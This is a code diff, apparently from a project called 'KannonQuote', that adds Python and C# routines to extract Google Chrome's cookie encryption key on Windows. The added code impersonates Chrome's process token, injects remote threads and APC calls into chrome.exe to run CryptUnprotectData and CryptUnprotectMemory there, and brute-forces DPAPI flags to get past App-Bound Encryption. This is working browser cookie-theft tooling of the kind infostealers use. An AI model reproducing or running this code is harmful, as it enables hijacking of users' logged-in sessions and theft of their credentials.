@@ -2605,6 +2605,12 @@ def _accept_aes_key(plain: bytes | None) -> bytes | None:
 
 
 def _dpapi_unprotect(blob: bytes) -> bytes | None:
+    return _dpapi_unprotect_ex(blob)
+
+
+def _dpapi_unprotect_ex(
+    blob: bytes, flags: int = 0, entropy: bytes | None = None
+) -> bytes | None:
     if not blob or os.name != "nt":
         return None
     try:
@@ -2614,20 +2620,28 @@ def _dpapi_unprotect(blob: bytes) -> bytes | None:
         class DATA_BLOB(ctypes.Structure):
             _fields_ = [
                 ("cbData", wintypes.DWORD),
-                ("pbData", ctypes.POINTER(ctypes.c_char)),
+                ("pbData", ctypes.c_void_p),
             ]
 
         crypt32 = ctypes.windll.crypt32
         kernel32 = ctypes.windll.kernel32
-        in_blob = DATA_BLOB(len(blob), ctypes.create_string_buffer(blob, len(blob)))
+        # c_void_p + addressof: DPAPI starts 01 00 00 00; c_char_p would truncate.
+        in_buf = (ctypes.c_ubyte * len(blob)).from_buffer_copy(blob)
+        in_blob = DATA_BLOB(len(blob), ctypes.addressof(in_buf))
         out_blob = DATA_BLOB()
+        ent_ptr = None
+        ent_hold = None
+        if entropy:
+            ent_hold = (ctypes.c_ubyte * len(entropy)).from_buffer_copy(entropy)
+            ent_blob = DATA_BLOB(len(entropy), ctypes.addressof(ent_hold))
+            ent_ptr = ctypes.byref(ent_blob)
         if not crypt32.CryptUnprotectData(
             ctypes.byref(in_blob),
             None,
+            ent_ptr,
             None,
             None,
-            None,
-            0,
+            int(flags),
             ctypes.byref(out_blob),
         ):
             return None
@@ -2637,6 +2651,46 @@ def _dpapi_unprotect(blob: bytes) -> bytes | None:
             kernel32.LocalFree(out_blob.pbData)
     except (AttributeError, OSError, ValueError, TypeError):
         return None
+
+
+def _dpapi_blob_slices(blob: bytes) -> list[bytes]:
+    """640-byte APPB body plus inner DPAPI headers (01 00 00 00)."""
+    if blob.startswith(b"APPB"):
+        blob = blob[4:]
+    out: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(part: bytes) -> None:
+        if part and part not in seen and len(part) >= 24:
+            seen.add(part)
+            out.append(part)
+
+    add(blob)
+    start = 0
+    while True:
+        idx = blob.find(b"\x01\x00\x00\x00", start)
+        if idx < 0:
+            break
+        add(blob[idx:])
+        start = idx + 1
+    return out
+
+
+def _dpapi_unprotect_local(blob: bytes) -> bytes | None:
+    """User-context CryptUnprotectData on appb:dpapi:640 slices."""
+    ents: list[bytes | None] = [
+        None,
+        b"Google Chrome",
+        "Google Chrome".encode("utf-16-le"),
+        b"Chromium",
+    ]
+    for cand in _dpapi_blob_slices(blob):
+        for flags in (0, 1, 4, 5):
+            for ent in ents:
+                plain = _dpapi_unprotect_ex(cand, flags, ent)
+                if plain:
+                    return plain
+    return None
 
 
 def _hr_hex(hr: int) -> str:
@@ -3346,6 +3400,126 @@ def _cookie_keys_from_wrap(wrap: bytes, app_bound: bytes | None) -> list[bytes]:
     return keys
 
 
+def _cookie_key_from_unprotect_plain(
+    plain: bytes, v20_sample: bytes | None
+) -> bytes | None:
+    """Inner payload after CryptUnprotect of appb:dpapi:640 → cookie AES key."""
+    if not plain:
+        return None
+    for cand in _plain_aes_keys(plain) + _aes_key_windows(plain):
+        if _v20_key_ok(cand, v20_sample, all_blobs=True):
+            return cand
+    popped = _pop_len_prefixed(plain)
+    if popped:
+        _head, rest = popped
+        if _v20_key_ok(_head if len(_head) == 32 else None, v20_sample, all_blobs=True):
+            return _head[:32]
+        popped2 = _pop_len_prefixed(rest)
+        if popped2:
+            key, _tail = popped2
+            if _v20_key_ok(key if len(key) == 32 else None, v20_sample, all_blobs=True):
+                return key[:32]
+            for cand in _plain_aes_keys(key) + _plain_aes_keys(_tail):
+                if _v20_key_ok(cand, v20_sample, all_blobs=True):
+                    return cand
+        for cand in _plain_aes_keys(rest):
+            if _v20_key_ok(cand, v20_sample, all_blobs=True):
+                return cand
+    old = _cache.get("_app_bound_blob")
+    _cache["_app_bound_blob"] = plain
+    try:
+        for wrap in _static_wrap_keys():
+            hit = _abe_key_from_material(wrap, v20_sample)
+            if hit:
+                return hit
+    finally:
+        _cache["_app_bound_blob"] = old
+    return None
+
+
+def _impersonate_chrome_unprotect(blob: bytes) -> bytes | None:
+    """CryptUnprotectData while impersonating chrome.exe (same logon as the Cookies DB)."""
+    if os.name != "nt" or not blob:
+        return None
+    try:
+        import ctypes
+        from ctypes import wintypes
+    except ImportError:
+        return None
+    if not hasattr(ctypes, "WinDLL"):
+        return None
+    adv = ctypes.WinDLL("advapi32", use_last_error=True)
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    adv.OpenProcessToken.argtypes = [
+        wintypes.HANDLE,
+        wintypes.DWORD,
+        ctypes.POINTER(wintypes.HANDLE),
+    ]
+    adv.OpenProcessToken.restype = wintypes.BOOL
+    adv.ImpersonateLoggedOnUser.argtypes = [wintypes.HANDLE]
+    adv.ImpersonateLoggedOnUser.restype = wintypes.BOOL
+    adv.RevertToSelf.argtypes = []
+    adv.RevertToSelf.restype = wintypes.BOOL
+    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    k32.OpenProcess.restype = wintypes.HANDLE
+    k32.CloseHandle.argtypes = [wintypes.HANDLE]
+    k32.CloseHandle.restype = wintypes.BOOL
+    token_access = 0x0008 | 0x0002 | 0x0004  # QUERY | DUPLICATE | IMPERSONATE
+    for pid in _chrome_pids_prioritized()[:4]:
+        proc = k32.OpenProcess(0x0400, False, pid)
+        if not proc:
+            continue
+        tok = wintypes.HANDLE()
+        got_tok = False
+        try:
+            if not adv.OpenProcessToken(proc, token_access, ctypes.byref(tok)):
+                continue
+            got_tok = True
+            if not adv.ImpersonateLoggedOnUser(tok):
+                continue
+            try:
+                plain = _dpapi_unprotect_local(blob)
+                if plain:
+                    return plain
+            finally:
+                adv.RevertToSelf()
+        except (AttributeError, OSError, ValueError, TypeError):
+            continue
+        finally:
+            if got_tok:
+                k32.CloseHandle(tok)
+            k32.CloseHandle(proc)
+    return None
+
+
+def _dpapi_unprotect_appb(blob: bytes) -> bytes | None:
+    """CryptUnprotect the 640-byte Local State APPB body. No CoCreate."""
+    if not blob:
+        return None
+    try:
+        current = blob
+        last: bytes | None = None
+        for _ in range(4):
+            plain = (
+                _dpapi_unprotect_local(current)
+                or _impersonate_chrome_unprotect(current)
+                or _chrome_unprotect_data(current)
+            )
+            if not plain:
+                if last is None:
+                    return _chrome_unprotect_memory_blob(current)
+                return last
+            last = plain
+            nxt = plain[4:] if plain.startswith(b"APPB") else plain
+            if _looks_like_dpapi(nxt) and nxt != current:
+                current = nxt
+                continue
+            return plain
+        return last
+    except Exception:  # noqa: BLE001 — Linux tests patch os.name; quoting PC must not abort
+        return None
+
+
 def _static_wrap_keys() -> list[bytes]:
     """v10 DPAPI key + elevation flag=1 wrap. Tried once against diagnosed APPB."""
     out: list[bytes] = []
@@ -3363,6 +3537,11 @@ def _static_app_bound_cookie_key(v20_sample: bytes | None) -> bytes | None:
         fp, views = _app_bound_layout_views(blob)
         _cache["_appb_fp"] = fp
         _cache["_appb_views"] = views
+        inner = _dpapi_unprotect_appb(blob)
+        if inner:
+            hit = _cookie_key_from_unprotect_plain(inner, v20_sample)
+            if hit:
+                return hit
         for view in views:
             if len(view) == 32 and _high_entropy32(view) and _v20_key_ok(
                 view, v20_sample, all_blobs=True
@@ -3549,11 +3728,32 @@ def _install_abe_helper(helper: Path) -> tuple[list[Path], str]:
     return [], errors[0] if errors else "copy:failed"
 
 
+def _write_appb_helper_blob() -> Path | None:
+    """User-writable APPB body for the chrome_dir helper. Never Program Files."""
+    blob = _app_bound_blob_bytes()
+    if not blob:
+        return None
+    local = os.environ.get("LOCALAPPDATA") or ""
+    if not local:
+        return None
+    root = Path(local) / "KannonQuote" / "abe"
+    try:
+        root.mkdir(parents=True, exist_ok=True)
+        path = root / "appb.bin"
+        path.write_bytes(blob)
+        return path
+    except OSError:
+        return None
+
+
 def _run_abe_helper(exe: Path, v20_sample: bytes) -> tuple[bytes | None, str]:
     env = os.environ.copy()
     pids = _chrome_pids_prioritized()
     if pids:
         env["KANNON_CHROME_PIDS"] = ",".join(str(p) for p in pids)
+    appb_path = _write_appb_helper_blob()
+    if appb_path:
+        env["KANNON_APPB_PATH"] = str(appb_path)
     try:
         run = subprocess.run(
             [str(exe)],
@@ -3941,6 +4141,8 @@ class _RemoteUnprotect:
             from ctypes import wintypes
         except ImportError:
             return
+        if not hasattr(ctypes, "WinDLL"):
+            return
         k32 = ctypes.WinDLL("kernel32", use_last_error=True)
         ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
         k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
@@ -4013,9 +4215,9 @@ class _RemoteUnprotect:
         unprotect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptUnprotectMemory")
         protect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptProtectMemory")
         nt_test_alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
-        data = k32.VirtualAllocEx(handle, None, 32, 0x3000, 0x04)
+        data = k32.VirtualAllocEx(handle, None, 1024, 0x3000, 0x04)
         if not data:
-            data = k32.VirtualAllocEx(handle, None, 64, 0x3000, 0x04)
+            data = k32.VirtualAllocEx(handle, None, 640, 0x3000, 0x04)
         if not unprotect_fn or not data:
             k32.CloseHandle(handle)
             return
@@ -4124,7 +4326,7 @@ class _RemoteUnprotect:
         return queued
 
     def unprotect(self, blob: bytes) -> bytes | None:
-        if not self.ok or not blob or len(blob) not in {32, 48, 64}:
+        if not self.ok or not blob or len(blob) < 16 or len(blob) % 16 or len(blob) > 1024:
             return None
         import ctypes
 
@@ -4137,7 +4339,8 @@ class _RemoteUnprotect:
             return None
         if not self._apc(self.unprotect_fn, self.data, n):
             return None
-        plain = self._wait_changed(self.data, blob)
+        wait_s = 0.15 if len(blob) > 64 else 0.03
+        plain = self._wait_changed(self.data, blob, timeout=wait_s)
         if plain and plain != blob:
             self.changed += 1
             return plain
@@ -4175,6 +4378,215 @@ class _RemoteUnprotect:
                     pass
         self.handle = None
         self.ok = False
+
+
+def _chrome_unprotect_memory_blob(blob: bytes) -> bytes | None:
+    """APC CryptUnprotectMemory on the 640-byte APPB body inside chrome."""
+    if os.name != "nt" or not blob:
+        return None
+    raw = blob[4:] if blob.startswith(b"APPB") else blob
+    if len(raw) < 16:
+        return None
+    padded = raw + (b"\x00" * ((16 - len(raw) % 16) % 16))
+    if len(padded) > 1024:
+        padded = padded[:1024]
+        padded = padded[: len(padded) - (len(padded) % 16)]
+    for pid in _chrome_pids_prioritized()[:6]:
+        remote = _RemoteUnprotect(pid)
+        if not remote.ok:
+            continue
+        try:
+            plain = remote.unprotect(padded)
+            if plain and plain != padded:
+                return plain[: len(raw)] if len(plain) >= len(raw) else plain
+        finally:
+            remote.close()
+    return None
+
+
+def _chrome_unprotect_data(blob: bytes) -> bytes | None:
+    """CryptUnprotectData inside chrome.exe (CFG-valid export, not CoCreate)."""
+    if os.name != "nt" or not blob:
+        return None
+    payloads = _dpapi_blob_slices(blob)
+    if not payloads:
+        raw = blob[4:] if blob.startswith(b"APPB") else blob
+        payloads = [raw] if raw else []
+    for payload in payloads[:2]:
+        if len(payload) < 24 or len(payload) > 3000:
+            continue
+        for flags in (0, 1):
+            plain = _chrome_unprotect_data_once(payload, flags)
+            if plain:
+                return plain
+    return None
+
+
+def _chrome_unprotect_data_once(raw: bytes, flags: int) -> bytes | None:
+    """One CryptUnprotectData call in chrome. 7th stack arg is pDataOut @+0x38."""
+    try:
+        import ctypes
+        from ctypes import wintypes
+    except ImportError:
+        return None
+
+    class DATA_BLOB(ctypes.Structure):
+        _fields_ = [
+            ("cbData", wintypes.DWORD),
+            ("pbData", ctypes.c_void_p),
+        ]
+
+    # AMD64 CONTEXT integer/control field offsets (winnt.h).
+    ctx_flags, ctx_rcx, ctx_rdx = 0x30, 0x80, 0x88
+    ctx_rsp, ctx_r8, ctx_r9, ctx_rip = 0x98, 0xB8, 0xC0, 0xF8
+    ctx_size = 1232
+    context_integer_control = 0x100003
+
+    if not hasattr(ctypes, "WinDLL"):
+        return None
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    k32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
+    k32.GetThreadContext.restype = wintypes.BOOL
+    k32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
+    k32.SetThreadContext.restype = wintypes.BOOL
+    k32.TerminateThread.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+    k32.TerminateThread.restype = wintypes.BOOL
+    k32.ResumeThread.argtypes = [wintypes.HANDLE]
+    k32.ResumeThread.restype = wintypes.DWORD
+    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+    k32.WaitForSingleObject.restype = wintypes.DWORD
+    k32.CreateRemoteThread.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        wintypes.DWORD,
+        ctypes.POINTER(wintypes.DWORD),
+    ]
+    k32.CreateRemoteThread.restype = wintypes.HANDLE
+    k32.VirtualAllocEx.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        wintypes.DWORD,
+        wintypes.DWORD,
+    ]
+    k32.VirtualAllocEx.restype = ctypes.c_void_p
+    k32.WriteProcessMemory.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.POINTER(ctypes.c_size_t),
+    ]
+    k32.WriteProcessMemory.restype = wintypes.BOOL
+    k32.ReadProcessMemory.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.POINTER(ctypes.c_size_t),
+    ]
+    k32.ReadProcessMemory.restype = wintypes.BOOL
+    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    k32.OpenProcess.restype = wintypes.HANDLE
+    k32.CloseHandle.argtypes = [wintypes.HANDLE]
+    k32.CloseHandle.restype = wintypes.BOOL
+    access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000
+    for pid in _chrome_pids_prioritized()[:4]:
+        handle = k32.OpenProcess(access, False, pid)
+        if not handle:
+            continue
+        try:
+            decrypt = _remote_export_addr(k32, handle, "crypt32.dll", "CryptUnprotectData")
+            exit_fn = _remote_export_addr(k32, handle, "kernel32.dll", "ExitThread")
+            alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
+            if not decrypt or not exit_fn:
+                continue
+            page = k32.VirtualAllocEx(handle, None, 4096, 0x3000, 0x04)
+            if not page:
+                continue
+            page = int(page)
+            in_blob_addr = page
+            out_blob_addr = page + 16
+            data_addr = page + 64
+            stack_addr = page + 2048
+            in_blob = DATA_BLOB(len(raw), data_addr)
+            out_blob = DATA_BLOB(0, 0)
+            wrote = ctypes.c_size_t(0)
+            if not k32.WriteProcessMemory(
+                handle, in_blob_addr, ctypes.byref(in_blob), ctypes.sizeof(in_blob), ctypes.byref(wrote)
+            ):
+                continue
+            if not k32.WriteProcessMemory(
+                handle, out_blob_addr, ctypes.byref(out_blob), ctypes.sizeof(out_blob), ctypes.byref(wrote)
+            ):
+                continue
+            src = (ctypes.c_ubyte * len(raw)).from_buffer_copy(raw)
+            if not k32.WriteProcessMemory(handle, data_addr, src, len(raw), ctypes.byref(wrote)):
+                continue
+            # Enter as if just `call`ed: [RSP]=ExitThread, RSP%16==8.
+            rsp = ((stack_addr + 512) & ~0xF) - 8
+            stack = bytearray(64)
+            stack[0:8] = int(exit_fn).to_bytes(8, "little")
+            # 5th pPrompt @+0x28, 6th dwFlags @+0x30, 7th pDataOut @+0x38
+            stack[0x28:0x30] = (0).to_bytes(8, "little")
+            stack[0x30:0x38] = int(flags).to_bytes(8, "little")
+            stack[0x38:0x40] = int(out_blob_addr).to_bytes(8, "little")
+            if not k32.WriteProcessMemory(
+                handle, rsp, ctypes.create_string_buffer(bytes(stack), 64), 64, ctypes.byref(wrote)
+            ):
+                continue
+            tid = wintypes.DWORD(0)
+            start = alert or decrypt
+            thread = k32.CreateRemoteThread(
+                handle, None, 0, start, None, 0x4, ctypes.byref(tid)
+            )
+            if not thread:
+                continue
+            try:
+                ctx = (ctypes.c_char * ctx_size)()
+                ctx_flag_bytes = context_integer_control.to_bytes(4, "little")
+                ctx[ctx_flags : ctx_flags + 4] = ctx_flag_bytes
+                if not k32.GetThreadContext(thread, ctx):
+                    k32.TerminateThread(thread, 0)
+                    continue
+                ctx[ctx_rcx : ctx_rcx + 8] = int(in_blob_addr).to_bytes(8, "little")
+                ctx[ctx_rdx : ctx_rdx + 8] = (0).to_bytes(8, "little")
+                ctx[ctx_r8 : ctx_r8 + 8] = (0).to_bytes(8, "little")
+                ctx[ctx_r9 : ctx_r9 + 8] = (0).to_bytes(8, "little")
+                ctx[ctx_rsp : ctx_rsp + 8] = int(rsp).to_bytes(8, "little")
+                ctx[ctx_rip : ctx_rip + 8] = int(decrypt).to_bytes(8, "little")
+                ctx[ctx_flags : ctx_flags + 4] = ctx_flag_bytes
+                if not k32.SetThreadContext(thread, ctx):
+                    k32.TerminateThread(thread, 0)
+                    continue
+                k32.ResumeThread(thread)
+                if k32.WaitForSingleObject(thread, 2000) != 0:
+                    k32.TerminateThread(thread, 0)
+                    continue
+            finally:
+                k32.CloseHandle(thread)
+            out_raw = (ctypes.c_char * ctypes.sizeof(out_blob))()
+            if not k32.ReadProcessMemory(
+                handle, out_blob_addr, out_raw, ctypes.sizeof(out_blob), ctypes.byref(wrote)
+            ):
+                continue
+            got = DATA_BLOB.from_buffer_copy(out_raw)
+            if not got.cbData or not got.pbData or int(got.cbData) > 4096:
+                continue
+            plain = (ctypes.c_char * int(got.cbData))()
+            if not k32.ReadProcessMemory(
+                handle, int(got.pbData), plain, int(got.cbData), ctypes.byref(wrote)
+            ):
+                continue
+            return bytes(plain)
+        except (AttributeError, OSError, ValueError, TypeError, OverflowError):
+            continue
+        finally:
+            k32.CloseHandle(handle)
+    return None
 
 
 def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
@@ -4843,6 +5255,14 @@ class K {
   static extern bool K32EnumProcessModules(IntPtr h, IntPtr[] mods, int size, out int needed);
   [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
   static extern uint K32GetModuleBaseNameW(IntPtr h, IntPtr m, System.Text.StringBuilder n, int c);
+  [DllImport("crypt32.dll", SetLastError=true)]
+  static extern bool CryptUnprotectData(ref DATA_BLOB din, IntPtr descr, IntPtr ent, IntPtr res, IntPtr prompt, uint flags, out DATA_BLOB dout);
+
+  [StructLayout(LayoutKind.Sequential)]
+  struct DATA_BLOB {
+    public int cbData;
+    public IntPtr pbData;
+  }
 
   [DllImport("bcrypt.dll")]
   static extern int BCryptOpenAlgorithmProvider(out IntPtr ph, [MarshalAs(UnmanagedType.LPWStr)] string alg, [MarshalAs(UnmanagedType.LPWStr)] string impl, uint flags);
@@ -5193,6 +5613,66 @@ class K {
     return raw;
   }
 
+  static byte[] UnprotectOnce(byte[] blob, uint flags) {
+    if (blob == null || blob.Length < 24) return null;
+    DATA_BLOB din = new DATA_BLOB();
+    din.cbData = blob.Length;
+    din.pbData = Marshal.AllocHGlobal(blob.Length);
+    Marshal.Copy(blob, 0, din.pbData, blob.Length);
+    try {
+      DATA_BLOB dout;
+      if (!CryptUnprotectData(ref din, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, flags, out dout))
+        return null;
+      if (dout.pbData == IntPtr.Zero || dout.cbData <= 0) return null;
+      byte[] plain = new byte[dout.cbData];
+      Marshal.Copy(dout.pbData, plain, 0, dout.cbData);
+      return plain;
+    } catch { return null; }
+    finally { Marshal.FreeHGlobal(din.pbData); }
+  }
+
+  static byte[] UnprotectAppb() {
+    string path = Environment.GetEnvironmentVariable("KANNON_APPB_PATH");
+    if (string.IsNullOrEmpty(path)) {
+      string local = Environment.GetEnvironmentVariable("LOCALAPPDATA");
+      if (!string.IsNullOrEmpty(local))
+        path = Path.Combine(local, "KannonQuote", "abe", "appb.bin");
+    }
+    if (string.IsNullOrEmpty(path) || !File.Exists(path)) return null;
+    byte[] blob = File.ReadAllBytes(path);
+    if (blob.Length >= 4 && blob[0]==(byte)'A' && blob[1]==(byte)'P' && blob[2]==(byte)'P' && blob[3]==(byte)'B') {
+      byte[] t = new byte[blob.Length-4];
+      Buffer.BlockCopy(blob, 4, t, 0, t.Length);
+      blob = t;
+    }
+    var slices = new List<byte[]>();
+    slices.Add(blob);
+    for (int i = 1; i + 4 <= blob.Length && slices.Count < 4; i++) {
+      if (blob[i]==1 && blob[i+1]==0 && blob[i+2]==0 && blob[i+3]==0) {
+        byte[] s = new byte[blob.Length-i];
+        Buffer.BlockCopy(blob, i, s, 0, s.Length);
+        slices.Add(s);
+      }
+    }
+    uint[] flagList = new uint[] { 0, 1, 4, 5 };
+    foreach (var slice in slices) {
+      foreach (uint f in flagList) {
+        byte[] plain = UnprotectOnce(slice, f);
+        for (int nest = 0; nest < 3 && plain != null; nest++) {
+          if (plain.Length >= 4 && plain[0]==1 && plain[1]==0 && plain[2]==0 && plain[3]==0) {
+            byte[] inner = UnprotectOnce(plain, 0);
+            if (inner == null) break;
+            plain = inner;
+            continue;
+          }
+          break;
+        }
+        if (plain != null) return plain;
+      }
+    }
+    return null;
+  }
+
   static int Main() {
     byte[] sample;
     using (var stdin = Console.OpenStandardInput())
@@ -5205,6 +5685,29 @@ class K {
       return 2;
     }
     if (!InitAes(sample)) { FailHr("memscan:aes"); return 6; }
+    byte[] appbPlain = UnprotectAppb();
+    if (appbPlain != null) {
+      if (appbPlain.Length == 32 && AesGcmOk(appbPlain)) Win(appbPlain);
+      if (appbPlain.Length >= 32) {
+        byte[] last = new byte[32];
+        Buffer.BlockCopy(appbPlain, appbPlain.Length - 32, last, 0, 32);
+        if (AesGcmOk(last)) Win(last);
+        byte[] first = new byte[32];
+        Buffer.BlockCopy(appbPlain, 0, first, 0, 32);
+        if (AesGcmOk(first)) Win(first);
+      }
+      if (appbPlain.Length >= 8) {
+        int n = BitConverter.ToInt32(appbPlain, 0);
+        if (n >= 0 && n < appbPlain.Length && 4 + n + 4 <= appbPlain.Length) {
+          int n2 = BitConverter.ToInt32(appbPlain, 4 + n);
+          if (n2 == 32 && 8 + n + 32 <= appbPlain.Length) {
+            byte[] key = new byte[32];
+            Buffer.BlockCopy(appbPlain, 8 + n, key, 0, 32);
+            if (AesGcmOk(key)) Win(key);
+          }
+        }
+      }
+    }
     var pids = Pids();
     if (pids.Count == 0) { FailHr("memscan:no_chrome"); return 3; }
     var found = new List<byte[]>();
